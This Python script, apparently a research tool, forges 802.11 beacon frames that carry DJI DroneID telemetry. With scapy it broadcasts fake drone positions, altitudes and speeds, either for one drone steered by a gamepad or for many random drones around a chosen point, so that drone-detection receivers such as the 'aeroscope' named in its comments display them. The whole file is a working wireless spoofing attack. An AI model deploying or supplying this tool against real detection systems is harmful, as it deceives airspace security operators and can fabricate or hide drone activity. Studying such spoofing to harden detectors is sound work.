from Beacon import *
import struct
import sys, getopt, argparse
from scapy.sendrecv import sendp
import random, string
from math import floor, sqrt
import time, os, calendar
import threading
from Drone import *
from scapy.utils import PcapWriter
import inputs

MAX_TRIGGERS = 1023
MAX_JXY = 32767

#### TODO
#  YAW ROLL PITCH IMPLEMENTATION
#  LATITUDE MOVEMENT ARE WAY BIGGER, WHY?
#  Speed, height, altitude are chosen randomly, but max value is set to sth reasonable... not 2**16-1
#  
#
#

'''
   Assemble the DJI payload to a 802.11 beacon packet
'''
def create_packet(beacon_base, payload):
    packet = beacon_base.copy()  

    # Not necessary but it appears in different DJI models
    vendor_microsoft = Dot11EltVendorSpecific(ID=221, len= 24, oui= 0x0050f2,info = b'\x02\x01\x01\x00\x00\x03\xa4\x00\x00\x27\xa4\x00\x00\x42\x43\x5e\x00\x62\x32\x2f\x00')

    # DJI Payload
    tag_vendor_dji = Dot11EltVendorSpecific(ID=221, len = len(payload) + 3,oui=0x263712, info = payload)
    packet = packet / vendor_microsoft / tag_vendor_dji 

    return packet


'''
Update the DJI Vendor ID info from the Scapy Beacon object
'''
def update_packet(prev_packet, new_payload):
    ts = calendar.timegm(time.gmtime())
    prev_packet.timestamp = ts
    # New DJI Payload
    new_tag_vendor_dji = Dot11EltVendorSpecific(ID=221, len = len(new_payload) + 3,oui=0x263712, info = new_payload)

    #is the last Vendor Specific tag... in case we added the Microsoft Vendor Tag
    prev_packet[Dot11EltVendorSpecific][len([prev_packet[Dot11EltVendorSpecific]])-1].payload = new_tag_vendor_dji
    return prev_packet



is_finish = 0
'''
This will check the drone attributes all the time and build and send a new packet
'''
def thread_send(d: Drone, beacon_base_packet):
    print("Start Thread")
    count = 0
    global is_finish

    old_payload = d.build_telemetry()
    packet = create_packet(beacon_base_packet, old_payload) # build first packet ever

    #packets_txt.write(packet_list[1][Dot11EltVendorSpecific][len([packet_list[1][Dot11EltVendorSpecific]])-1].show(dump=True))
    while is_finish == 0:
        count += 1
        time.sleep(0.5)
        try:
            new_payload = d.build_telemetry()

            if new_payload != old_payload: # Updates on drone, otherwise send same packet
                print("UPDATED")
                packet = update_packet(packet, new_payload)
                print("Latitude: {} --- Longitude: {}".format(d.latitude, d.longitude))
                print("Altitude: {} ".format(d.altitude))
                print("Speed: {}".format(sqrt(d.v_north **2 + d.v_east **2)/100))

            sendp(packet, iface=interface, verbose=1, loop=0, count=1)
            old_payload = new_payload
            time.sleep(0.5)

        except KeyboardInterrupt:
            is_finish = 1
            break

    print("Exiting Thread. Packet sent {} times".format(count))


def normalize(value, max=MAX_TRIGGERS, minimum=1):
    n = (value - minimum) / (max - minimum)
    return n

def process_event(drone, axis, value, ev_type):

    try: # To know in which direction of the axis is the event
        value_sign = float(value / abs(value)) #( -1 or 1)
    except ZeroDivisionError:
        return False

     ## Too many events. Let's filter
     # Sync Events and Released button we dont care now
    if value == 0 and  axis != "Z":
        return False
    
    # Just consider above 15000 so we just consider clear joystick movement. Not soft movements. 1 and -1 for the Key and triggers
    if value != 1  and value != -1 and abs(value) < 15000 and  axis != "Z":
        return False

    print("Type: {} Code: {} State: {}".format(ev_type, axis, value)) # Events we actually want

    if axis == "X": # Increase Longitude and speed according to value
        
        print("Update longitude")
        drone.update_longitude(value_sign) 

    elif axis == "Y": # Modify Latitude
         
        print("Update latitude")
        drone.update_latitude(value_sign) 

    if axis == "HAT0X": # Modify Longitude
        
        print("Update longitude")
        drone.update_longitude(value_sign)
            
    elif axis == "HAT0Y": # Modify Latitude
        
        print("Update latitude")
        drone.update_latitude(value_sign)
        
    elif axis == "RY":
        print("Update altitude")
        # Increase Altitude (and Vertical Speed)
        # Minimum Altitude 0. ToDo limit upper boundary
        if drone.altitude >= 0 and drone.altitude < 2**16-1:                       
            drone.altitude = floor(drone.altitude + value_sign * (-1)) # Same reason. Axis value sign is inverted
            if drone.altitude <0:
                drone.altitude = 0

    elif axis == "RX":
        # modify yaw
        return False

    # Change speed to show 3 different colors.
    elif axis == "TL" and value == 1: # Skip when button released event.
        drone.v_east =  (drone.v_east + 200) % 2500# speed is divided by 100 in the aeroscope.If we want to increase 1 in the aeroscope, we add 100 here
        drone.v_north = (drone.v_east + 200) % 2500
        
    elif axis == "Z": # Increase speed's values, both in X and Y axis
        if value == 0: # If not pressed ToDo ... not working. Do we really want that
            drone.v_north = 0
            drone.v_east = 0
        # Consider if speed is in negative or positive
        elif value == MAX_TRIGGERS: # keep increasing
            drone.v_east = floor(drone.v_east + 100) if drone.v_east > 0 else floor(drone.v_east - 100)
            drone.v_north = floor(drone.v_north + 100) if drone.v_north > 0 else floor(drone.v_north - 100)
        
        else: # Speed is related to the value received. Lets normalize it until +-25
            new_speed = 25 * normalize (value) * 100 # speed multiplies 100 always
            drone.v_north = floor(new_speed)
            drone.v_east = floor(new_speed)
        
    elif axis == "MODE": # Random position
        #restart = True
        drone.longitude, drone.latitude = drone.random_location()
    
    return True

def get_gamepad():
    try:
        joystick = inputs.devices.gamepads[0]
        print("Gamepad assigned")
    except IndexError:
        print("No gamepad found")
        joystick = None
    return joystick

'''
Single Drone Spoofing
If it does not get any input, the values are set randomly

If it detects a joystic, it will process the events and will update drone's values.
'''
def one_drone():
    print("Press intro to set default")
    ssid = str(input("SSID: "))
    lat = (input("Latitude: "))
    lon = (input("Longitude: "))
    altitude = (input("Altitude (Max 65535): "))
    home_lat = (input("Home Latitude: "))
    home_long = (input("Home Longitude: "))
    uuid = str(input("UUID (16 chars): "))
  

    # Set drone's initial attributes
    drone = Drone(ssid=ssid, lat=lat, lon=lon, altitude=altitude, home_lat=home_lat, home_lon=home_long, uuid=uuid)

    # Create base beacon packet for carrying info of a drone
    source_address = drone.mac_address
    ssid = drone.ssid
    beacon_base_packet = Beacon(source_address, ssid).get_beacon()

    # ==== BUILD PACKET LIST =====
    # Flight Info beacons It won't change
    finfo_payload = drone.build_finfo() # ToDo Get user input toset flight info
    finfo_packet = create_packet(beacon_base_packet,finfo_payload)
    
    joystick = get_gamepad()
    print("Joystick  {}".format(joystick))

    if joystick is not None:
        global is_finish # To stop the thread
        drone.v_east = 0
        drone.v_north = 0

        send_thread = threading.Thread(target=thread_send, args=(drone, beacon_base_packet))
        send_thread.start()

        while 1:      
            try:
                print("Waiting event")
                events = joystick._do_iter() # It blocks untl event is detected
                
                #does not work still blocks...
                if events is None or len(events) == 0:
                    print("About to break. No events... but does not work")
                    continue

                for event in events:
                    # print("Type: {} Code: {} State: {}".format(event.ev_type, event.code, event.state))

                    axis, value, evtype = event.code.split("_")[1], event.state, event.ev_type
                    process_event(drone, axis, value, evtype)

            except KeyboardInterrupt:
                is_finish = 1
                send_thread.join()
                break
    else: # No joystick
        '''
        Spoofing a single drone without any motion
        '''
        # Create the DJI payload in bytes and build the packet with scapy
        telemetry_payload = drone.build_telemetry()
        telemetry_packet = create_packet(beacon_base_packet, telemetry_payload)
        packet_list = []
        packet_list.append(finfo_packet)
        packet_list.append(telemetry_packet)
        sendp(packet_list, iface=interface, loop=1, inter=0.5)

def random_spoof(n, point=None):
    
    n_drones = n
    # ToDo Check if I need to copy the packet, or otherwise it reuses the same

    source_address = ""
    ssid = ""
    beacon = Beacon(source_address, ssid ) #
    beacon_base_packet = beacon.get_beacon()

    packet_list = [] # set of packets to be sent
    # First all packets are generated and they will be sent afterwards
    for i in range( int(n_drones)):
        beacon_base_copy = beacon_base_packet.copy()
        print("===========================")
        print("Setting Drone {}".format(i))
        print("===========================")
        
        drone = Drone(i, point)
        beacon_base_copy.ssid =  drone.ssid
        beacon_base_copy.addr2 = drone.mac_address
        print("SSID: {}".format(drone.ssid))
        print("MAC Address {}".format(drone.mac_address))
        print("Location [Lon Lat]: {} {}".format(drone.longitude, drone.latitude))   
        # Build DJI Payload
        payload = drone.build_telemetry()
        telemetry_packet = create_packet(beacon_base_copy, payload)
        packet_list.append(telemetry_packet)
    
    print("=========All drones are ready ==================")
    #pktdump = PcapWriter("telemetry.pcap", append=True, sync=True)
    #pktdump.write(telemetry_packet)
    sendp(packet_list, iface=interface, loop=1, inter=2)


'''
=====================================================================
Main
Arguments indicate whether to spoof a single specific drone or N random drones (around a given point)
=====================================================================
'''

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--interface", help="Spoof on drone. poofing parameters are set by the user.")
parser.add_argument("-r", "--random", help="Spoof randomly N drones")
parser.add_argument("-a", "--area", help="Define point where drones will be spoofed eg: -a '46.76 7.62 '")

args = parser.parse_args()
print("Arguments: {}".format(args))

if not args.interface:
    raise SystemExit(
"Usage: {sys.argv[0]} -i  <interface> [-r] <number of drones> [-a] <'latitude longitude'> \n \
-r N            Spoof N random drones around the map. \n \
-a 'lat long'     If set, drones are spoofed around point \n \
Interface must be in monitor mode")

else:

    interface = args.interface
    
    if args.random : # Consider fail when you pass 0 drones... ToDo
        n_random = args.random
        
        print("Spoofing {} drones".format(n_random))
        if args.area:
            point = args.area.split()
            print(point)
            random_spoof(n_random, point)
        random_spoof(n_random)

    else: #Spoof only one drone
        one_drone()